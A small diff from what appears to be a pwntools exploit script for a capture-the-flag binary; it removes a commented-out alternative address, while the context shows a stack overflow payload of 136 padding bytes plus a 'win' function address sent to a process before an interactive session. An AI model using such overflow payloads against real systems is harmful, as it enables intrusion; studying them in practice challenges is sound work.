@@ -29,7 +29,6 @@ def main():
     print(data)
 
     win_addr = p64(0x000000000040064a, endianness="little")
-    #win_addr = p64(0x00000000004006be, endianness="little")
     r.sendline(b"a"*136 + win_addr)
 
     r.interactive()
